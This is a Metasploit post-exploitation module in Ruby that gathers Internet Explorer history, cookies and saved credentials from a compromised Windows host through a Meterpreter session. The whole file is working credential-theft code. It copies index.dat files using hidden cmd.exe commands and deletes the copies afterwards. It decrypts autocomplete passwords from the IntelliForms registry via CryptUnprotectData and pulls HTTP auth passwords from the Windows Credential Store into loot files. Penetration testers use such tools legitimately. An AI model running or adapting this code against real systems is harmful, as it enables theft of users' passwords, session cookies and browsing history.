##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/file'
require 'msf/core/post/windows/registry'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::Registry

  def initialize(info={})
    super(update_info(info,
      'Name'            => "Windows Gather Internet Explorer User Data Enumeration",
      'Description'     => %q{
        This module will collect history, cookies, and credentials (from either HTTP
        auth passwords, or saved form passwords found in auto-complete) in
        Internet Explorer. The ability to gather credentials is only supported
        for versions of IE >=7, while history and cookies can be extracted for all
        versions.
      },
      'License'         => MSF_LICENSE,
      'Platform'        => ['win'],
      'SessionTypes'    => ['meterpreter'],
      'Author'          => ['Kx499']
    ))
  end

  #
  # RAILGUN HELPER FUNCTIONS
  #
  def is_86
    pid = session.sys.process.open.pid
    return session.sys.process.each_process.find { |i| i["pid"] == pid} ["arch"] == "x86"
  end


  def pack_add(data)
    if is_86
      addr = [data].pack("V")
    else
      addr = [data].pack("Q")
    end
    return addr
  end


  def mem_write(data, length)
    pid = session.sys.process.open.pid
    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
    mem = process.memory.allocate(length)
    process.memory.write(mem, data)
    return mem
  end


  def read_str(address,len,type)
    begin
      pid = session.sys.process.open.pid
      process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
      raw = process.memory.read(address, len)
      if type == 0 #unicode
        str_data = raw.gsub("\x00","")
      elsif type == 1 #null terminated
        str_data = raw.unpack("Z*")[0]
      elsif type == 2 #raw data
        str_data = raw
      end
    rescue
      str_data = nil
    end
    return str_data || "Error Decrypting"
  end


  #
  # DECRYPT FUNCTIONS
  #
  def decrypt_reg(entropy,data)
    c32 = session.railgun.crypt32
    #set up entropy
    salt = []
    entropy.each_byte do |c|
      salt << c
    end
    ent = salt.pack("s*")

    #save values to memory and pack addresses
    mem = mem_write(data, 1024)
    mem2 = mem_write(ent, 1024)
    addr = pack_add(mem)
    len = pack_add(data.length)
    eaddr = pack_add(mem2)
    elen = pack_add((entropy.length + 1)*2)

    #cal railgun to decrypt
    if is_86
      ret = c32.CryptUnprotectData("#{len}#{addr}",16,"#{elen}#{eaddr}",nil,nil,1,8)
      len,add = ret["pDataOut"].unpack("V2")
    else
      ret = c32.CryptUnprotectData("#{len}#{addr}",16,"#{elen}#{eaddr}",nil,nil,1,16)
      len,add = ret["pDataOut"].unpack("Q2")
    end

    return "" unless ret["return"]
    return read_str(add, len, 2)
  end


  def decrypt_cred(daddr, dlen)
    c32 = session.railgun.crypt32
    #set up entropy
    guid = "abe2869f-9b47-4cd9-a358-c22904dba7f7"
    ent_sz = 74
    salt = []
    guid.each_byte do |c|
      salt << c*4
    end
    ent = salt.pack("s*")

    #write entropy to memory and pack addresses
    mem = mem_write(ent,1024)
    addr = pack_add(daddr)
    len = pack_add(dlen)
    eaddr = pack_add(mem)
    elen = pack_add(ent_sz)

    #prep vars and call function
    if is_86
      ret = c32.CryptUnprotectData("#{len}#{addr}",16,"#{elen}#{eaddr}",nil,nil,0,8)
      len,add = ret["pDataOut"].unpack("V2")
    else
      ret = c32.CryptUnprotectData("#{len}#{addr}",16,"#{elen}#{eaddr}",nil,nil,0,16)
      len,add = ret["pDataOut"].unpack("Q2")
    end

    #get data, and return it
    return "" unless ret["return"]
    return read_str(add, len, 0)
  end


  #
  # Extract IE Data Functions
  #
  def get_stuff(path, history)
    t = DateTime.new(1601,1,1,0,0,0)
    tmpout = ""
    if history
      re = /\x55\x52\x4C\x20.{4}(.{8})(.{8}).*?\x56\x69\x73\x69\x74\x65\x64\x3A.*?\x40(.*?)\x00/m
    else #get cookies
      re = /\x55\x52\x4C\x20.{4}(.{8})(.{8}).*?\x43\x6F\x6F\x6B\x69\x65\x3A(.*?)\x00/m
    end

    outfile = session.fs.file.new(path, "rb")
    until outfile.eof?
      tmpout << outfile.read rescue nil
    end
    outfile.close

    urls = tmpout.scan(re)
    urls.each do |url|
      #date modified
      hist = {}
      origh = url[0].unpack('H*')[0]
      harr = origh.scan(/[0-9A-Fa-f]{2}/).map { |i| i.to_s}
      newh = harr.reverse.join
      hfloat = newh.hex.to_f
      sec = hfloat/10000000
      days = sec/86400
      timestamp = t + days
      hist["dtmod"] = timestamp.to_s

      #date accessed
      origh = url[1].unpack('H*')[0]
      harr = origh.scan(/[0-9A-Fa-f]{2}/).map { |i| i.to_s}
      newh = harr.reverse.join
      hfloat = newh.hex.to_f
      sec = hfloat/10000000
      days = sec/86400
      timestamp = t + days
      hist["dtacc"] = timestamp.to_s
      hist["url"] = url[2]
      if history
        @hist_col << hist
        @hist_table << [hist["dtmod"],hist["dtacc"],hist["url"]]
      else
        @cook_table << [hist["dtmod"],hist["dtacc"],hist["url"]]
      end
    end
  end


  def hash_url(url)
    rg_advapi = session.railgun.advapi32
    tail = 0
    prov = "Microsoft Enhanced Cryptographic Provider v1.0"
    flag = 0xF0000000
    context = rg_advapi.CryptAcquireContextW(4, nil, prov, 1, 0xF0000000)
    h = rg_advapi.CryptCreateHash(context['phProv'], 32772, 0, 0, 4)
    hdata = rg_advapi.CryptHashData(h['phHash'], url, (url.length + 1)*2, 0)
    hparam = rg_advapi.CryptGetHashParam(h['phHash'], 2, 20, 20,0)
    hval_arr = hparam["pbData"].unpack("C*")
    hval = hparam["pbData"].unpack("H*")[0]
    rg_advapi.CryptDestroyHash(h['phHash'])
    rg_advapi.CryptReleaseContext(context['phProv'], 0)
    tail = hval_arr.inject(0) { |s,v| s += v }
    htail = ("%02x" % tail)[-2,2]
    return "#{hval}#{htail}"
  end


  def run
    #check for meterpreter and version of ie
    if session.type != "meterpreter" and session.platform !~ /win/
      print_error("This module only works with Windows Meterpreter sessions")
      return 0
    end

    #get version of ie and check it
    ver = registry_getvaldata("HKLM\\SOFTWARE\\Microsoft\\Internet Explorer", "Version")
    print_status("IE Version: #{ver}")
    if ver =~ /(6\.|5\.)/
      print_error("This module will only extract credentials for >= IE7")
    end

    #setup tables
    @hist_table = Rex::Ui::Text::Table.new(
      "Header"  => "History data",
      "Indent"  => 1,
      "Columns" => ["Date Modified", "Date Accessed", "Url"])

    @cook_table = Rex::Ui::Text::Table.new(
      "Header"  => "Cookies data",
      "Indent"  => 1,
      "Columns" => ["Date Modified", "Date Accessed", "Url"])

    cred_table = Rex::Ui::Text::Table.new(
      "Header"  => "Credential data",
      "Indent"  => 1,
      "Columns" => ["Type", "Url", "User", "Pass"])

    #set up vars
    rg = session.railgun
    host = session.sys.config.sysinfo
    @hist_col = []

    #set paths
    regpath = "HKCU\\Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2"
    vist_h = "\\AppData\\Local\\Microsoft\\Windows\\History\\History.IE5\\index.dat"
    vist_hlow = "\\AppData\\Local\\Microsoft\\Windows\\History\\Low\\History.IE5\\index.dat"
    xp_h = "\\Local Settings\\History\\History.IE5\\index.dat"
    vist_c = "\\AppData\\Roaming\\Microsoft\\Windows\\Cookies\\index.dat"
    vist_clow = "\\AppData\\Roaming\\Microsoft\\Windows\\Cookies\\Low\\index.dat"
    xp_c = "\\Cookies\\index.dat"
    h_paths = []
    c_paths = []
    base = session.fs.file.expand_path("%USERPROFILE%")
    if host['OS'] =~ /(Windows 7|2008|Vista)/
      h_paths << base + vist_h
      h_paths << base + vist_hlow
      c_paths << base + vist_c
      c_paths << base + vist_clow
    else
      h_paths <<  base + xp_h
      c_paths << base + xp_c
    end

    #Get history and cookies
    print_status("Retrieving history.....")
    h_paths.each do |hpath|
      if session.fs.file.exists?(hpath)
        print_line("\tFile: #{hpath}")
        #copy file
        cmd = "cmd.exe /c type \"#{hpath}\" > \"#{base}\\index.dat\""
        r = session.sys.process.execute(cmd, nil, {'Hidden' => true})

        #loop until cmd is done
        #while session.sys.process.each_process.find { |i| i["pid"] == r.pid}
        #end
        sleep(1)

        #get stuff and delete
        get_stuff("#{base}\\index.dat", true)
        cmd = "cmd.exe /c del \"#{base}\\index.dat\""
        session.sys.process.execute(cmd, nil, {'Hidden' => true})
      end
    end

    print_status("Retrieving cookies.....")
    c_paths.each do |cpath|
      if session.fs.file.exists?(cpath)
        print_line("\tFile: #{cpath}")
        #copy file
        cmd = "cmd.exe /c type \"#{cpath}\" > \"#{base}\\index.dat\""
        r = session.sys.process.execute(cmd, nil, {'Hidden' => true})

        #loop until cmd is done
        #while session.sys.process.each_process.find { |i| i["pid"] == r.pid}
        #end
        sleep(1)

        #get stuff and delete
        get_stuff("#{base}\\index.dat", false)
        cmd = "cmd.exe /c del \"#{base}\\index.dat\""
        session.sys.process.execute(cmd, nil, {'Hidden' => true})
      end
    end

    #get autocomplete creds
    print_status("Looping through history to find autocomplete data....")
    val_arr = registry_enumvals(regpath)
    if val_arr
      @hist_col.each do |hitem|
        url = hitem["url"].split('?')[0].downcase
        hash = hash_url(url).upcase
        if val_arr.include?(hash)
          data = registry_getvaldata(regpath, hash)
          dec = decrypt_reg(url, data)
          #decode data and add to creds array
          header = dec.unpack("VVVVVV")
          offset = header[0] + header[1] #offset to start of data
          cnt = header[5]/2 # of username/password combinations
          secrets = dec[offset,dec.length-(offset + 1)].split("\x00\x00")
          for i in (0..cnt).step(2)
            cred = {}
            cred["type"] = "Auto Complete"
            cred["url"] = url
            cred["user"] = secrets[i].gsub("\x00","")
            cred["pass"] = secrets[i+1].gsub("\x00","") unless secrets[i+1].nil?
            cred_table << [cred["type"],cred["url"],cred["user"],cred["pass"]]
          end
        end
      end
    else
      print_error("No autocomplete entries found in registry")
    end

    #get creds from credential store
    print_status("Looking in the Credential Store for HTTP Authentication Creds...")
    #get data from credential store
    ret = rg.advapi32.CredEnumerateA(nil,0,4,4)
    p_to_arr = ret["Credentials"].unpack("V")
    arr_len = ret["Count"] * 4 if is_86
    arr_len = ret["Count"] * 8 unless is_86

    #read array of addresses as pointers to each structure
    raw = read_str(p_to_arr[0], arr_len,2)
    pcred_array = raw.unpack("V*") if is_86
    pcred_array = raw.unpack("Q*") unless is_86

    #loop through the addresses and read each credential structure
    pcred_array.each do |pcred|
      raw = read_str(pcred, 52,2)
      cred_struct = raw.unpack("VVVVQVVVVVVV") if is_86
      cred_struct = raw.unpack("VVQQQQQVVQQQ") unless is_86

      location = read_str(cred_struct[2],512, 1)
      if location.include? "Microsoft_WinInet"
        decrypted = decrypt_cred(cred_struct[6],cred_struct[5])
        cred = {}
        cred["type"] = "Credential Store"
        cred["url"] = location.gsub("Microsoft_WinInet_", "")
        cred["user"] = decrypted.split(':')[0] || "No Data"
        cred["pass"] = decrypted.split(':')[1] || "No Data"
        cred_table << [cred["type"],cred["url"],cred["user"],cred["pass"]]
      end
    end

    #store data in loot
    if not @hist_table.rows.empty?
      print_status("Writing history to loot...")
      path = store_loot(
        'ie.history',
        'text/plain',
        session,
        @hist_table,
        'ie_history.txt',
        'Internet Explorer Browsing History')
      print_status("Data saved in: #{path}")
    end

    if not @cook_table.rows.empty?
      print_status("Writing cookies to loot...")
      path = store_loot(
        'ie.cookies',
        'text/plain',
        session,
        @cook_table,
        'ie_cookies.txt',
        'Internet Explorer Cookies')
      print_status("Data saved in: #{path}")
    end

    if not cred_table.rows.empty?
      print_status("Writing gathered credentials to loot...")
      path = store_loot(
        'ie.user.creds',
        'text/plain',
        session,
        cred_table,
        'ie_creds.txt',
        'Internet Explorer User Credentials')

      print_status("Data saved in: #{path}")
      #print creds
      print_line("")
      print_line(cred_table.to_s)
    end
  end
end
